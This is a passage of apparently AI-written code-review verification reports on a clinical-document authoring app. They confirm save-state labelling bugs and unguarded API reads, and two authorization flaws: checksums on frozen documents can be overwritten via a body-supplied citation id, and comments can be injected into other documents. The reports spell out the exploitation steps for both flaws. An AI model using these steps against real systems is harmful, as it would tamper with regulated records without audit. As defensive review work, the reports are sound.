**Severity, as you would grade it:** medium. The false part of the label is about the device copy of an unsaved draft, not about the governed record: "Unsaved changes" and "Save failed" are both true, and the browser's leave-page prompt stays armed. Each route that makes it false today needs a narrow trigger (browser storage blocked or full, or typing while a save is in flight). What stops it being low is that the host's leave dialog repeats the false promise at the moment the author decides whether to discard work.

**What I checked:** at 7087f46e2. HEAD moved to 26fbf978a and then 185bbbb0e while I worked. Another session also left `server/middleware/orgMembership.ts` modified and one new server test uncommitted. None of that is mine, and `git diff 7087f46e2 HEAD` is empty for every file below. I did not modify the repository.
- `RichSectionEditor.tsx`: 177-313 (props), 317-325, 450-475, 535, 842, 952-979 (onUpdate → cacheDraft), 1082-1131, 1134-1175 (doSave), 1191-1231, 1351-1354, 1812, 1872-1883, 2165-2250, 2552-2578, 2647-2695.
  - A guard could have gone in three places and is absent from all of them: the label lookup (2651-2652), `cacheDraft`'s catch (1088-1090), and doSave's success branch (1161-1167).
  - No prop check pairs `chrome='full'` with `storageKey`.
- Importers, searched across the whole repo by module path. There are exactly four production mounts:
  - `DocumentWorkbench.tsx:3785-3927`, itself mounted by `DocumentAuthoring.tsx:98` and `DocumentCanvas.tsx:386`
  - `EctdCoauthor.tsx:945-963`
  - `ProtocolDevSection.tsx:163-179`
  - `PathwayPanes.tsx:973-984`
  
  Everything else is a test, or a string in `scripts/ci/check-canvas-path.selftest.mjs:83`.
- Host code read:
  - `DocumentWorkbench.tsx`: 139-152, 871, 915-930, 1976-2129 (the canvas is not locked while the save request is in flight: `readOnly={docSealed}` at 3834; a save does not remount the editor, only 2260 and 2651 do), 3522, 3667-3668, 5028-5043, 5080-5118.
  - `EctdCoauthor.tsx`: 940-963.
  - `ProtocolDevSection.tsx`: 86-91, 163-179.
  - `PathwayPanes.tsx`: 866-868, 907-987.
- `@tiptap/core` 3.31.3 `dist/index.js:6563`: the `update` event fires only when a transaction changes the document.
- A probe in the scratchpad only (`scratchpad/hsb2-probe/`, vitest 4.1.7 + jsdom) that mounts the real component: 6/6 pass. It includes a control showing the cache check does see a real cache.

**Why:**
- **The label ignores caching.** `dirty: … 'Unsaved changes — cached on this device'` (`RichSectionEditor.tsx:320`) and `error: … 'Save failed — kept on this device'` (:322) are rendered as `SAVE_META[saveState].label` (:2652) inside `{full && (` (:2648). Nothing in that path reads `storageKey` or whether the write succeeded.
- **Caching is gated on the key.** `if (!storageKey) return;` (:1084), with the defaults `storageKey = null` (:460) and `chrome = 'full'` (:462).
- **The missing-`storageKey` route is latent:**
  - DocumentWorkbench: `storageKey={activeSection.id}` (:3836). `id` is a string (:140), and the editor only mounts past `!activeSection ?` (:3522).
  - EctdCoauthor: `storageKey={'coauthor:' + activeDoc.id}` (:953), always truthy, and the mount is never read-only.
  - ProtocolDevSection: `storageKey={writable ? … : null}` (:176) is null only together with `readOnly={!writable}` (:174). A read-only mount cannot become dirty:
    - editing is off (:874, :1024-1025);
    - Replace is hidden by `{!readOnly && (` (:2210);
    - programmatic inserts refuse when `!editor.isEditable` (:1384, :1419, :1434);
    - image insertion is off (:1747, :1787) and the source textarea is read-only (:2557);
    - ⌘S on an unchanged buffer returns `'saved'` (:1144-1149).
  - PathwayPanes: `chrome="bare"` (:976), so `const full = chrome === 'full'` (:1812) removes the footer.
- **Route B, false today (probe-confirmed): the storage write fails.** `} catch { /* storage full — the server save path is unaffected */` (:1088-1089) swallows the failure and the label still says "cached". In the probe, a failed save then shows "Save failed — kept on this device" while `dc::S1` is null.
- **Route C, false today (probe-confirmed): the author types while a save is in flight.** When the save lands, `const stillDirty = nowSerialized !== serialized;` (:1156) leads to `setSaveState(stillDirty ? 'dirty' : 'saved')` (:1159). The code then calls `localStorage.removeItem(cacheKeyFor(storageKey))` (:1161-1163) regardless of `stillDirty`.
  - Probe result: the footer reads "Unsaved changes — cached on this device", and the canvas holds words `onSave` never received, yet `dc::S1` is null.
  - It stays false until the next keystroke. Repaints do not change the document, so they never re-cache (:628-642).
- **The host's leave dialog repeats the claim unconditionally.** It says "…are cached on this device…" (`DocumentWorkbench.tsx:5100-5101`) and "…offers them back when you return…" (5116-5118). It opens whenever the section is dirty (:871, :920-927) and receives no cache state (:5029-5041). Under B or C, choosing "Leave without saving" loses the text and no restore is offered on return.
- **Minor miscitation in the report.** `authoringUnsavedWork.test.tsx:338-342` asserts the host's page-header text ("on this device only", `DocumentWorkbench.tsx:3667-3668`), not this footer. Separately, `richSectionEditorUnsaved.test.tsx:73` already renders the false state (full chrome, editable, `storageKey={null}`) and asserts nothing about the label.

**If confirmed, the smallest correct fix:** the report's fix (make the label depend on `storageKey`) closes only the latent route. Routes B and C and the leave dialog stay false. Instead:
1. Make `cacheDraft` the only code that writes the device cache, routing the source textarea's inline write at :2564-2571 through it. Have it record the outcome as `deviceCached`: true after a successful `setItem`; false when there is no key, the write throws, or the entry is removed.
2. In doSave's success branch, replace the unconditional `removeItem` (:1161-1167) with `cacheDraft(nowSerialized)`. That call already removes the entry when the buffer is clean and writes it when not.
3. Derive the dirty and error labels from `(saveState, deviceCached)` rather than the static map, for example "Unsaved changes — not cached on this device".
4. Expose `deviceCached` to hosts through the component's ref handle or a callback, so the leave dialog (`DocumentWorkbench.tsx:5100-5118`) stops promising a restore it cannot deliver.

Related but separate from HS-B-2 (probe-confirmed; needs its own triage and likely grades higher). Source mode is the raw-text fallback used when stored content fails the fidelity check (:1832-1842). There, doSave computes `nowSerialized` from a stale copy of `sourceText` captured when the save started (:1155). Text typed during an in-flight save is then reported as "All changes saved" and `onDirtyChange(false)` disarms both the browser prompt and the leave dialog. The device cache is also cleared, so that text is not saved or cached anywhere, while the footer says everything is saved.

---

## Verification of V-2 (source-mode save race)
**Verdict:** CONFIRMED

**Severity, as you would grade it:** high. The author is told "All changes saved" (and the Workbench header says "Saved") while text they can see on screen is in neither the record nor the device cache. The same moment also turns off all three loss guards: the browser prompt, the host's leave dialog and the crash cache. It is not a blocker: the record itself is correct and attributed (it holds exactly what was sent), and the trigger is narrow. It needs a source-mode section, typing while the save is in flight, and no keystroke after the save lands, because any later keystroke re-arms everything.

**What I checked:**
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx` (unchanged between 7087f46e2 and HEAD 10ad41a2):
  - `lastSavedRef` at :535.
  - The fidelity gate `boot` at :787-839, and the `sourceText` state at :842.
  - Rich-mode `onUpdate` at :952-979, for contrast.
  - `cacheDraft` at :1082-1093, `restoreCached` at :1105-1120, and `doSave` at :1134-1175.
  - The `onDirtyChange` effect at :1177-1179, the `beforeunload` guard at :1191-1202, and the unmount flush at :1215-1233.
  - The imperative handle's `save`/`getContent` and its deps at :1350-1440, and `onKeyDown` ⌘S at :1480-1491.
  - The source-mode notice at :1832-1842, the textarea `onChange` at :2556-2577, and the footer label and Save button at :2648-2693.
- Guards that could have prevented this: the textarea is not locked during a save (`readOnly={readOnly}` only, :2557). No effect syncs `value` back into `sourceText`; `value` is used only at mount (:535, :788, :842, :1099). No host remounts the editor on save (the keys are section/doc id, plus `contentEpoch`, which only a revert bumps).
- Hosts:
  - `DocumentWorkbench.tsx`: mount at :3785-3836 (`autosaveMs={null}`, `onDirtyChange={setEditorDirty}`, `storageKey`). `requestLeave` at :915-929 (`if (!dirty) { applyNav(target); return true; }`). Header Save at :3313-3326 (`dirty ? 'Save' : 'Saved'`). `saveSectionContent` at :1976-2129: a plain awaited PATCH with no modal, so the textarea stays typeable for the whole round trip.
  - `ProtocolDevSection.tsx`: `format="text"`, `onDirtyChange={setDirty}`, `canSave` requires `dirty` (:88-90), and `runSave` → `editorRef.save()` then `setReason('')` (:118-146).
  - `EctdCoauthor.tsx`: :946-953, with leave guards on `editorDirty` at :445 and :471.
  - `PathwayPanes.tsx`: :973-984 (`autosaveMs={600}`, `format="text"`, no `storageKey`).
- Reproduction harness (outside the repo): `<scratch>/verify-V2/sourceModeSaveRace.test.tsx` and `reach.test.tsx`, run with the repo's vitest 4.1.7 and jsdom. 5/5 pass.

**Why:**
- `doSave` is a `useCallback` over `sourceText` (deps at :1175). On the button, ⌘S and handle paths it is the latest render's copy, so `serialized = sourceText` (:1135-1136). After `await onSave(...)` it re-reads the same closure variable: `const nowSerialized = boot.mode === 'source' ? sourceText : …` (:1155). So `const stillDirty = nowSerialized !== serialized;` (:1156) is always `false` in source mode. This is structural, not only a timing race.
- It then runs `setDirty(false)`, `onDirtyChange?.(false)` and `setSaveState('saved')` (:1157-1159), and an unconditional `localStorage.removeItem(cacheKeyFor(storageKey))` (:1161-1167).
- Meanwhile the mid-save keystroke had cached the newer text (:2564-2571). The removal runs after it, so that cache entry is deleted.
- In rich mode the same line calls `serialize(editor)` on the live editor, which is why rich mode escapes this.
- Reproduced with `<figure>` content, which forces source mode. The author edits (S1), clicks Save, types S2 while `onSave` is pending, then `onSave` resolves. Observed:
  - textarea = S2
  - footer = "All changes saved"
  - `onDirtyChange` → `false, false`
  - `dc::sec-1` = null
  - Save button disabled
  - `beforeunload` not prevented
  - `onSave` called once, with S1
- Remounting with the record (S1) and the same `storageKey` shows S1 and no restore offer, so S2 is gone.
- Controls behave as expected: source mode with no mid-save typing saves S1 correctly, and rich mode with the same sequence stays "Unsaved changes" with `onDirtyChange(true)`.
- Consequences in the hosts:
  - DocumentWorkbench: the header reads "Saved" and `requestLeave` navigates without the dialog.
  - ProtocolDev: `canSave` goes false and the reason is cleared.
- Reach is wider than "rare markup". The `reach` probe shows that `format="text"` (ProtocolDev) opens in source mode for:
  - two spaces after a period
  - a tab
  - a leading indent
  - 3 or more blank lines
- What bounds the finding: ⌘S still saves S2, because a fresh `doSave` compares the current `sourceText` with `lastSavedRef`. Any further keystroke also re-dirties and re-caches. The author has no reason to do either while the screen says everything is saved.

**If confirmed, the smallest correct fix:**
1. Add `const sourceTextRef = useRef(value ?? '')`. Assign it synchronously in the textarea `onChange` (next to `setSourceText`) and in `restoreCached`.
2. In `doSave`, read `sourceTextRef.current` for both `serialized` (:1135-1136) and `nowSerialized` (:1155).
3. Replace the unconditional `removeItem` (:1161-1167) with `cacheDraft(nowSerialized)`, which already removes the entry when clean and writes it when dirty.
4. Optionally mirror rich mode's `setSaveState(s => s === 'saving' ? s : …)` in the textarea handler (:2563).

Where the existing proposals fall short:
- The HS-B-2 verifier's Route C fix (`cacheDraft(nowSerialized)` alone) does **not** fix source mode. With the stale `nowSerialized === serialized === lastSavedRef`, it still removes the cache and still reports clean. The ref is what fixes it.
- A fix limited to `nowSerialized` is also incomplete. In the autosave path the textarea's `setTimeout(() => void doSave(), autosaveMs)` (:2575) captures the handler's render, whose `sourceText` is the text **before** the triggering keystroke. The harness confirms it: typing "…X" then "…XY" inside one debounce window saved "…X", showed "All changes saved" over "…XY", and reported `onDirtyChange(false)`. This path is reachable in PathwayPanes (MDX, outside the launch catalog), and a single-keystroke edit there takes the early-return "Nothing outstanding" branch and is never sent. Reading `serialized` from the ref at the start of `doSave` closes this too.
- The rich-mode twin needs the same cache fix: after a mid-save edit the rich control also showed "Unsaved changes — cached on this device" with `dc::sec-2` null, because of the same unconditional `removeItem`.

---

## Verification of HS-C-1
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium. The screen does show a false governed state ("No protocol in development", or "Ready to finalize" with the Finalize button enabled), but only when the body is JSON of the wrong shape. The current route never sends such a body, an HTML or proxy 200 already reaches the honest error branch, and the server refuses any finalize the gate should have blocked. That makes it a real defect with a narrow trigger.
**What I checked:**
- **Client read path:** `ProtocolDev.tsx` 1–233 at `7087f46e2`; line 189 is the same at HEAD `10ad41a2`. `dataConnect.tsx` 30–450. `queryClient.ts` `apiRequest` 362–423.
- **Server and mount:** `protocol-dev.routes.ts` 1–49, mounted at `register-inline-routes.ts:1017`, `mount-routes.ts:60-83`. The JSON 404 for unmatched `/api` is at `services.ts:583`. No global middleware reshapes JSON bodies.
- **Render path:** `ProtocolDevWorkspace.tsx` 305–400, `ProtocolDevPanes.tsx` 38–67, `ProtocolGov.tsx` 82–137.
- **Backstops:** `protocol-development-service.ts` 374–390, `pdev-view-assembler.ts` 384–591, and the hostile-payload probe (it asserts only that nothing crashes).
- **Where a guard could have been:** there is none at the call site. No ProtocolDev* file reads `meta` or `pendingStore`. The assembler never sends `readyToFinalize`.
- **Executed:** a harness in the scratchpad only; no repository file was created, edited or deleted. I extracted the committed file with `git show 7087f46e2:…` and ran it with the real sibling components (unchanged from `7087f46e2`) against 9 bodies. I also ran the real `apiRequest` with `fetch` stubbed.
- **Note:** during this review another session left an uncommitted change in the working tree: `isRowsWith('id','sections','completenessFindings')` at line 189. I graded the committed file and tested that change separately.

**Why:**
- **Nothing rejects a wrong-shaped 200.** `ProtocolDev.tsx:189` passes no guard. `dataConnect.tsx:266` rejects a shape only `if (guard && …)`. `:442` flattens any non-array to `NO_ROWS`, and `:448` then sets `empty` with no `error`. The module says so itself at `:439-441`: "Without a guard a non-array 200 is silently flattened to zero rows, which renders as "nothing here yet" — an empty state that is not true."
- **Executed at `7087f46e2`, empty case:** `{data:{}}`, `{}`, `{error:'…'}`, `"unexpected"` and `{data:null}` all land on the same branch as a genuine `{data:[]}`. The screen shows "No protocol in development" and invites "Start a protocol", which would be a real governed create. AnA is told "this organisation has no protocol in development yet" (`:64`).
- **Executed at `7087f46e2`, "Ready to finalize" case:** `{data:[{}]}` and `{data:[{id:"7"}]}` both render "0 of 0 required sections complete Ready to finalize No findings. Finalize protocol", with the button enabled. `ProtocolDevPanes.tsx:47` `const ready = !findings.some(…)` treats absent findings as ready, and `ProtocolGov.tsx:130` enables the button on `ready`.
- **With a numeric id the signing ceremony opens.** For `id:"7"`, `canWrite` is true (`ProtocolDevWorkspace.tsx:317-318`), so the click opens signing. Only the server's check at `protocol-development-service.ts:378-380` refuses it.
- **The trigger is narrow.** The route sends only `{data, meta}` (`protocol-dev.routes.ts:40`), the 42P01 answer (`:43`), 403 or 500. `apiRequest` throws on every non-OK status (`queryClient.ts:398-419`), and that reaches the error branch. An HTML 200 fails `res.json()` in `liveGetOrNull` and also lands on "Couldn't load the protocol" (executed), so the report's "WAF page" example is wrong. Unguarded `useLiveRows` is the documented opt-in norm (`dataConnect.tsx:186-188`).

**If confirmed, the smallest correct fix:**
- **The report's `isRowsWith('id')` is not enough.** `{data:[{id:"7"}]}` passes it and still shows "Ready to finalize" on a writable id; that is the report's own "surgical" case. Name the fields the gate reads: `isRowsWith<PdevDoc>('id','sections','completenessFindings')`.
- **The gate itself must fail closed.** `in` accepts a key that is present but null. Executed against the working-tree change, `{data:[{id:"7",sections:null,completenessFindings:null}]}` still renders "Ready to finalize". At `ProtocolDevPanes.tsx:47`, set `ready` only when `Array.isArray(doc.completenessFindings)`. Better still, have the assembler send the engine's `readyToFinalize`, which it computes and then discards at `pdev-view-assembler.ts:496-503`, and treat any non-boolean as not ready.
- **Two cases no guard reaches.** The route's own `{data:[],meta:{pendingStore:true}}` (`protocol-dev.routes.ts:43`) and `{data:null}` (the guard is skipped for null at `dataConnect.tsx:266`) both still render "No protocol in development" (executed). Destructure `meta` at `:189` and branch on `isPendingStore({ meta })` before `ProtocolEmptyState`.

## Verification of HS-C-2
**Verdict:** CONFIRMED
**Severity, as you would grade it:** low. Both numbers are true and the sentence states no readiness verdict. The screen shows the same pair (ring "100%" beside "Sections 12/14"), and `facts` carries `completenessPercent` and each section's `required`, so this is a missing qualifier in a model-context sentence (polish), not a false governed state.
**What I checked:**
- `ProtocolDev.tsx` 50–125 (`anaContextFor`).
- `pdev-view-assembler.ts` 486–553.
- `protocol-development-logic.ts` 24–155 (the templates and `evaluateCompleteness`).
- `ProtocolDevPanes.tsx` 38–67 and `ProtocolGov.tsx` 98–137.
- `surfaceContext.ts`: the summary is forwarded to AnA every turn (`V2App.tsx:721-732`).
- Executed: mounted the real surface with 12 required sections complete and 2 optional sections not started, then read the published context.

**Why:**
- `ProtocolDev.tsx:71` counts every section. `:84` prints `${doc.completeness}% complete — ${done} of ${secs.length} `.
- `doc.completeness` is `pct` over required sections only (`pdev-view-assembler.ts:493-495`), sent at `:551`. `:553` sends all sections, each with its `required` flag.
- Executed output: AnA gets "100% complete — 12 of 14 section(s) complete". The screen shows `Sections12/14` and `12 of 12 required sections complete`.
- Every template has optional sections (`protocol-development-logic.ts:44-45,55-56,67,75`). The report's example is slightly off: clinical is 11 required + 2 optional, so the real sentence reads "100% complete — 11 of 13".

**If confirmed, the smallest correct fix:** the report's fix is correct. Count `done` and the total over `secs.filter(s => s.required)`, or label both figures ("of required sections" and "N of M sections overall"). Related: at `pdev-view-assembler.ts:495` the assembler reports 0% when a protocol has no required sections, where the engine deliberately returns null ("there is no percentage", `protocol-development-logic.ts:124-130`). Using `requiredCompletionPct` would keep one source.

## Verification of HS-C-3
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium. A failed read is drawn as an empty diff, and a failed design list as "no persisted study design yet", which breaks the file's own honest-state rule (`ProtocolDevDerivation.tsx:31-34`). The trigger is a malformed 200 that the real routes never send, no write is reachable from either state, and a retry works around it.
**What I checked:**
- **Derivation tab:** `ProtocolDevDerivation.tsx` 1–457.
- **Design picker:** `ProtocolDevDesign.tsx` 43–170 (`send` 51–56, `useTenantDesigns` 63–80, `BindDrawer` 89–129).
- **Server:** `protocol-development.ts:307-323`, `design-derivation-service.ts` 60–190, `design-derivation.ts` 149–160 and 525–572, and `study-design.ts:533-545` with `listStudyDesigns`.
- **Transport:** `queryClient.ts:398-419`.
- **Executed:** the real components, once with `apiRequest` mocked and once with the real `apiRequest` and `fetch` stubbed.

**Why:**
- **Derivation tab.** `:103` `if (!res.ok || !json)` is the only rejection, then `:104-108` returns `ready`. `:89` `(raw ?? {})` and `:91-95` default every bucket to `[]`. Executed: `{}`, `{error:'x'}` and an enveloped `{data:{…derivation:{proposed:[…]}}}` each render five "Nothing in this bucket." panels (`:162`) under "…study design not named by the server" (`:438`). The enveloped case hides a real proposed path. An HTML 200 correctly shows "failed".
- **Design picker.** `ProtocolDevDesign.tsx:55` `return json ?? {};` and `:72` `Array.isArray(j.designs) ? j.designs : []` lead to `:122` "This organisation has no persisted study design yet." Executed for a 200 `{}`, and also for a 200 HTML body, which the report does not mention.
- **The trigger is narrow.** The real routes send `{documentId, studyDesignId, derivation}` (`protocol-development.ts:315-319`) and `{ designs }` (`study-design.ts:540`); executed with the real shape, the picker lists the design. A genuine derivation always carries 12 or more `unevidenced` rows (`design-derivation.ts:525-537,569`), so five empty buckets can only come from a broken read.
- **No write follows.** Apply stays disabled when nothing is selected (`:414`), and the empty picker offers only Close.
- **Overstatement in the report.** "Everything already reconciled" goes too far: "Unchanged (0)" is on screen too, which says nothing agrees either.
- **Separate defect.** The 409 "unbound" branch at `:102` is dead code. `apiRequest` throws on every non-OK status except 401, so `!res.ok` at `:103` only ever sees a 401. Executed, a 409 renders "The derivation could not be read — No study design is bound…", which is honest but not the designed unbound state.

**If confirmed, the smallest correct fix:**
- **Derivation:** in `loadDerivation`, return `failed` unless `json.derivation` is an object whose five buckets are all arrays; `asDerivation` must not default silently on the read path. The report's alternative "(or `studyDesignId`)" is not enough: a body with `studyDesignId` but no `derivation` still draws five empty buckets.
- **Picker:** in `useTenantDesigns`, call `setError` when `j.designs` is not an array. This also covers the HTML-200 case, because `send()` turns an unreadable body into `{}`.
- **While there:** catch the thrown 409 by status (`e.status === 409`) in the effect so the tab reaches `unbound`.

---

## Verification of SEC-A-1
**Verdict:** CONFIRMED
**Severity, as you would grade it:** blocker — a governed evidence-lineage record (a citation's stored checksum) can be changed on a document the caller has no permission on, including a FROZEN/APPROVED one, with zero audit trail, and the state the rail shows the reviewer ("the checksum recorded at cite time still matches") becomes false with no visible change — this is exactly the blocker definition: a regulated record changed without the control the product claims, and a governed state shown is false.

**What I checked** (all at `7087f46e2`, re-confirmed unchanged at HEAD `10ad41a2`):
- `server/routes/authoring.router.ts:112-181` — global JWT/tenant middleware: establishes only authenticated tenant membership, no document-level permission.
- `server/routes/authoring.router.ts:405-463` (`router.use('/sections/:sectionId', ...)`) — the only per-request write guard on this path: `checkSectionWritable(pool, req.params.sectionId, tenantId)` and `canEditSection(req, req.params.sectionId)`, both keyed on the **path** `sectionId`.
- `server/routes/authoring.router.ts:4304-4362` — the handler itself. It carries its own comment admitting the design: `":sectionId is addressing only. A citation is identified by cite_id within the caller's tenant, and refreshSourceCitation scopes on the tenant — the section in the path is not a second scope and was never read as one"` (`4306-4309`). It reads `const { cite_id } = req.body;` (`4311`) and calls `refreshSourceCitation(tenantId, String(cite_id))` (`4333`) — never `req.params.sectionId`.
- `server/services/clinical-regulatory-evidence/source-usage.service.ts:488-529` — `refreshSourceCitation`: `SELECT ... FROM authoring_citations WHERE id = $1 AND tenant_id = $2` (`502-503`), refuses only `if (row.frozen_at)` (`508`), then `UPDATE authoring_citations SET payload_sha256 = $1 WHERE id = $2 AND tenant_id = $3` (`525-529`). No `section_id`/`doc_id` predicate anywhere, no audit call.
- Contrast, same file: `citeSource`/`removeSourceCitation` (called at `authoring.router.ts:2524` and `2549-2556`) **are** correctly bound to `String(req.params.sectionId)`. `refresh-token` is the odd one out among the section-scoped citation routes.
- `server/middleware/authoringObjectAuthorization.ts:14-15` (`SAFE_METHODS = new Set(['GET','HEAD','OPTIONS'])`, skipped in `authoringObjectAuthorization` at `216-221,236-238`) and `132-140` (`sectionMatch` resolves scope from the **path** section for every `/sections/:id/*` route, including `refresh-token`). The file does have a citation-aware branch, `resolveCitationScope` (`72-100`) used only for `/citations/:id` (`195-201`) — `refresh-token` doesn't match that path shape, so the citation actually mutated is never object-authorized by this middleware either. Two authorization layers (router guard + gateway middleware) both check the path section; neither checks the citation's own document.
- Freeze never marks citations frozen: `server/routes/authoring.router.ts:3707-3915` (freeze transaction: `INSERT INTO frozen_documents`, `UPDATE authoring_documents SET status='FROZEN'`, `createAuditTrail`, `writeChainedAuditRow`) touches no `authoring_citations` row. E-sign (`3924-4010+`) likewise never touches it.
- `grep -n "UPDATE authoring_citations" server/` — the only two hits setting `frozen_at` are in `source-usage.service.ts:__tests__/source-usage.pglite.integration.test.ts:362,440` (test-only). No production code path ever sets `authoring_citations.frozen_at`, so the `if (row.frozen_at)` refusal in `refreshSourceCitation` is dead in production — every citation stays refreshable forever, on any document status.
- `server/routes/authoring.router.ts:4183-4204` (`GET /docs/:docId/citations`) — scoped by `tenant_id` only (`WHERE s.doc_id=$1 AND c.tenant_id=$2`), and GET bypasses `authoringObjectAuthorization` per `SAFE_METHODS` above, so any tenant member can enumerate `cite_id`s belonging to documents they have no permission on — supplying the id needed to exploit `refresh-token`.
- `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:1873-1889,4619-4621` — the button calls `POST /api/authoring/sections/${activeSectionId}/refresh-token` with `{ cite_id }`; nothing here changes the server-side finding, it just shows the legitimate caller only ever sends its own section's citation ids — the vulnerability is that the server accepts any tenant-wide `cite_id` regardless of who sends it.
- `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:440-449` — confirms the exact rail wording, `'The checksum recorded at cite time still matches this source record.'`
- `git log --oneline 7087f46e2..10ad41a2` and `git diff --stat 7087f46e2..10ad41a2`: the only commits are `10ad41a2` (role gate on the ten `protocol-*.ts` routers), `185bbbb0`, `26fbf978`. None touches `authoring.router.ts`, `source-usage.service.ts`, `authoringObjectAuthorization.ts`, or `DocumentWorkbench.tsx`. **Nothing between `7087f46e2` and HEAD changes this finding**; it stands as-is at HEAD. (I ignored the uninstructed in-progress `ProtocolDev.tsx` working-tree edit per the task note — it is unrelated to this path regardless.)

**Why:** The two guards that exist on this route (`checkSectionWritable`/`canEditSection` in the router, and `authoringObjectAuthorization`'s `sectionMatch`) both authorize against the section named in the URL. The handler's own comment (`authoring.router.ts:4306-4309`) confirms this is not an oversight but the intended contract: the citation to mutate is chosen by `cite_id` from the body, scoped only by `tenant_id`. Since `frozen_at` is never set anywhere in production (confirmed by grep), the service's only defense — `if (row.frozen_at) return {ok:false, reason:'frozen'}` — never fires. The result: any tenant member who has edit rights on **any one** unlocked section can, by supplying a `cite_id` obtained from the unguarded `GET /docs/:docId/citations`, silently overwrite `payload_sha256` on a citation belonging to a document they have no grant on, including one that is FROZEN or APPROVED (signed) — since freeze/e-sign never touch citation rows. No audit row is written by the handler or the service, so the change is invisible in the Part 11 trail (21 CFR 11.10(e)), and the Sources rail's "recorded at cite time still matches" (`DocumentWorkbench.tsx:449`) becomes false with no record of who changed it or what the prior value was (11.10(a)/11.50). This is a textbook broken-object-level-authorization (IDOR) bug: the object actually written (the citation, and transitively its owning document) is never the object the authorization layer resolved.

**If confirmed, the smallest correct fix:**
- In `refreshSourceCitation`'s SQL, bind the lookup and update to the path section: `WHERE id = $1 AND section_id = $2 AND tenant_id = $3` on both the `SELECT` (`source-usage.service.ts:501-503`) and the `UPDATE` (`525-529`), and pass `req.params.sectionId` through from the router (`4333`). Once bound, the router's existing `checkSectionWritable`/`canEditSection` checks against that same section already correctly cover the citation's true parent document's lock/permission state — no separate `frozen_at`-on-citations mechanism is strictly required for that half of the fix.
- Write an audit row (old/new checksum, citation id, section id) **in the same transaction** as the update — currently there is no transaction at all (`pool.query`, not a client/BEGIN). Given the instructions' governed-write rule, this should go through `writeChainedAuditRow`, not merely a plain `authoring_audit_trail` insert, since it is a Part-11-relevant lineage mutation analogous to freeze/e-sign, which already use the chained writer.
- Where the report's fix is incomplete: it proposes *either* binding to `section_id` *or* setting `frozen_at` at freeze time as alternatives; in fact the `section_id` bind is the necessary fix (it re-establishes that the already-checked authorization target is the actual mutated object), while marking citations `frozen_at` at freeze time is a useful defense-in-depth addition (and separately worth doing, since it's currently dead code misleading anyone who reads it as a working control) but not a substitute for the binding fix on its own — without the section bind, marking `frozen_at` at freeze would still leave every *unfrozen* document's citations cross-document-writable by any tenant member with edit rights anywhere. Also fix the wording, per the report: "recorded at cite time" is only true after the checksum can no longer move silently.

---

## Verification of SEC-A-2
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high — the write is correctly gated against the path section's true document (A), so no document's *content* or signature state is forged and no user's *identity* is spoofed; but a member with a granted role on any one document can inject comment rows and audit-trail rows into any other document in the tenant, including a frozen one, and can force a false "unresolved comments" narrative into another document's freeze decision. That is "materially misled about governed content or its state" via an object-level authorization bypass (BOLA), not a silent falsification of the document's sealed content itself, which is what would make it a blocker.

**What I checked:**
- `server/routes/authoring.router.ts:2254-2320` (handler, read at HEAD `10ad41a2`), `:2279-2285` (only path-section-belongs-to-tenant check), `:2296,2302` (`doc_id`/`parent_comment_id` inserted verbatim from `req.body`), `:2308-2314` (`createAuditEvent(doc_id, …)`).
- `server/routes/authoring.router.ts:710-752` (`createAuditEvent`/`createAuditTrail` legacy wrapper — writes the caller-supplied `docId` as given, no re-derivation).
- `server/routes/authoring.router.ts:413-455` (`router.use('/sections/:sectionId', …)`, the PATCH/POST/DELETE gate) and `:299-373` (`canEditSection`) — both key off `req.params.sectionId`, resolved via `resolveAuthoringSectionScope`, i.e. the path section's *real* document (A). Neither reads `req.body.doc_id`.
- `server/middleware/authoringObjectAuthorization.ts:126-138` (`sectionMatch` → `resolveAuthoringSectionScope(pool, tenantId, sectionId)`, action `comment` from `actionFromPath`) and `:216-223` (this global gate is mounted at `/api` ahead of `/api/authoring`, per `server/bootstrap/register-inline-routes.ts:308-311`) — confirms the *only* authorization performed for this route is against the path section's true document, never the body's `doc_id`.
- `server/services/authoring/authoring-permissions.ts:154-181` (`resolveAuthoringSectionScope` joins `authoring_sections.doc_id` — the section's real, non-spoofable document column — to `authoring_documents`), `:125` (`documentStatusAllowsAction`: action `comment` is allowed on *any* document status, including FROZEN — so freeze does not by itself block comment-writing on the path document, which sharpens rather than weakens the finding: nothing in this chain would have stopped a write to a frozen B even if `doc_id` were checked correctly), `:185-236` (`decideAuthoringPermission` requires a real `doc_permissions` row scoped to `scope.docId`, i.e. document A — so exploitation does require the attacker to hold a genuine AUTHOR/OWNER/REVIEWER/APPROVER grant on *some* document, matching the report's "member with comment rights on one document").
- DDL: `db/migrations/20260725_authoring_document_loop_tables.sql:84-97` — `authoring_comments.doc_id UUID` is nullable with **no FK** to `authoring_documents` or to `authoring_sections.doc_id`; only `authoring_comments_section_tenant_fkey` (on `section_id, tenant_id`) exists (`:196-199`). `migrations/20260728_authoring_comments_threading.sql:58-68` — `parent_comment_id` FK is `REFERENCES authoring_comments(id)` alone, not scoped to section or tenant. Nothing in the schema stops `doc_id` or `parent_comment_id` from naming an unrelated row.
- Downstream reads that treat the spoofed `doc_id` as authoritative:
  - `authoring.router.ts:2603-2617` (`GET /documents/:id/comments … WHERE c.doc_id = $1 AND c.tenant_id = $2`) — the forged thread appears under document B.
  - `authoring.router.ts:5758-5776` (`GET /docs/:docId/audit … WHERE doc_id = $1 AND tenant_id = $2`) — the forged `comment_added`/`reply_added` row appears in B's audit trail.
  - `authoring.router.ts:3777-3781` (freeze's open-comment census: `SELECT COUNT(*) … FROM authoring_comments WHERE doc_id = $1 AND tenant_id = $2 AND status = 'open'`) and `:3809-3822` (`DOCUMENT_NOT_SETTLED` 409, requiring `acknowledgeUnresolved`) and `:3823-3826` (the acknowledgment note, `"[Sealed with ${openCommentCount} unresolved comment(s)…]"`, which is written into the frozen record's reason) — a phantom comment filed against B changes B's freeze outcome and, if acknowledged, becomes a false statement baked into B's own permanent frozen-record reason.
  - `authoringObjectAuthorization.ts:43-68` (`resolveCommentScope`, used by `PATCH /comments/:commentId`) resolves the comment's *authorization* scope via `c.section_id → authoring_sections.doc_id`, i.e. the comment's true owning document (A, the attacker's own), not the spoofed `c.doc_id` (B). So a legitimate holder of rights on B who tries to resolve/dismiss the injected thread is evaluated against A and gets `permission-denied` — B's own reviewers cannot clear it.
